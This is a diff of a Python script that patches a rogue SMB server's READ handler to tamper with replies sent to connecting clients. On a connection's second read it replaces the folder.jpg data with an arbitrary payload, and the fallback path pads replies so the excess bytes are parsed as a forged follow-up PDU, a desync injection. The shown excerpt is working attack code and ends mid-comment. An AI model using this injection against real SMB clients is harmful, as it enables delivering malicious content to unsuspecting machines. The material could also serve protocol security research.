@@ -79,17 +79,29 @@ def build_followup_read_reply(mid, sid, tid, payload=b"INJECTED\r\n"):
 _ORIG_RD = SMB2Commands.smb2Read
 
 
+_PATCHED_CONNS = set()
+_READ_COUNT = {}
+
 def patched_rd(connId, smbServer, recvPacket):
     res = _ORIG_RD(connId, smbServer, recvPacket)
-    if DLEN or INJECT or PAYLOAD:
+    _READ_COUNT[connId] = _READ_COUNT.get(connId, 0) + 1
+    second = _READ_COUNT[connId] == 2
+    if (DLEN or INJECT or PAYLOAD) and (INJECT or PAYLOAD) and second and connId not in _PATCHED_CONNS:
         try:
+            _PATCHED_CONNS.add(connId)
             resp = res[0][0]
             raw = resp['Buffer']
             if not isinstance(raw, (bytes, bytearray)):
                 raw = raw.getData()
             buf = bytearray(raw)
             real = len(buf)
-            if (INJECT or PAYLOAD) and real:
+            if (INJECT or PAYLOAD) and real and PAYLOAD and second:
+                # clean second-READ replacement: the folder.jpg READ reply
+                # carries MY payload with correct DataLength (no desync).
+                resp['Buffer'] = bytes(PAYLOAD)
+                resp['DataLength'] = len(PAYLOAD)
+                print('READ2 replace: payload=%dB mid=%d' % (len(PAYLOAD), recvPacket['MessageID']), flush=True)
+            elif (INJECT or PAYLOAD) and real:
                 # desync injection: client requested 65535; it consumes exactly
                 # 65535 bytes of the reply; anything beyond stays in the socket
                 # and is parsed as the NEXT PDU. Pad the payload to 65535 then
